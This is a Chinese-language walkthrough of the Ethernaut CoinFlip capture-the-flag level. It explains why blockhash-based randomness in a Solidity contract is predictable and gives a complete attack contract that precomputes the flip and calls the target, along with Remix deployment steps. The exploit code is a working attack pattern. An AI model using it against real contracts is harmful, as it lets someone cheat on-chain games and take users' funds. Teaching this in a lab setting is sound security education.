3_CoinFlip
=
本关要求
--

  1.This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.  

合约代码
--
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract CoinFlip {

      using SafeMath for uint256;
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

      constructor() public {
        consecutiveWins = 0;
      }

      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }  
分析
--
本关要求我们预测对10次硬币的正反  

查看<code>flip</code>方法可知，<code>coinFlip</code>的值决定硬币正反，<code>coinFlip</code>的值通过<code>blockValue.div(FACTOR)</code>计算得到  

<code>blockValue</code>的值为进行预测时当前区块的<code>blockhash</code>  

因为<code>FACTOR</code>的值为常量，所以如果能提前预知<code>blockValue</code>的值，就能预测硬币的正反  

因为有<code>if (lastHash == blockValue)</code>的判断，同一个区块的合约只能提交一次。所以我们采用合约调用的方法，先在我们编写的合约内计算硬币的正反，再调用本关合约，提交预测的结果  

编写攻击合约代码  
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";


    // 被调用合约接口
    interface CoinFlipInterface {
        function flip(bool _guess) external returns (bool);
    }

    // 攻击合约
    contract CoinFlipAttack{

        using SafeMath for uint256;
        address private addr;
        CoinFlipInterface cf_interface;

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor(address _addr) public {
            addr = _addr;
            //cf_ins = CoinFlip(_addr);
            cf_interface = CoinFlipInterface(_addr);
        }

    // 使用本关合约相同代码计算硬币正反
        function getSide() private view returns  (bool) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            return side;
        }

    // 调用接口实例
        function attack() public {
            bool side = getSide();
            cf_interface.flip(side);
        }

    }
部署本关合约，并查看合约地址  

![图片](https://user-images.githubusercontent.com/35074461/196595386-591c69c0-b59c-459e-b930-5688b0808c10.png)  
  
编译攻击合约，设置Remix部署环境为Injected Provider，连接Metamask。设置部署地址为0x1474ADE39c052Ffb14aA38726c63Fd8972FFb044  
  
![图片](https://user-images.githubusercontent.com/35074461/196595791-c42836e4-471b-402c-8b22-9ac9d129a8be.png)  

点击attack进行合约攻击，查看预测结果，发现攻击成功  
  
![图片](https://user-images.githubusercontent.com/35074461/196593086-7c9df5e9-68d1-4506-bbf0-8f0bca4cb16b.png)  
继续提交直至成功10次，完成本关  
  
![图片](https://user-images.githubusercontent.com/35074461/196594859-f4bf89a1-d10e-4ddb-a385-5b65c870b061.png)  


Ps:
--
<code>blockhash(block.number.sub(1)</code>是一种常见的伪随机数生成漏洞，更多关于智能合约随机数漏洞，可查看[《智能合约中的随机数漏洞》](https://github.com/Gednoveh/SmartContractSecurity/blob/main/%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B)
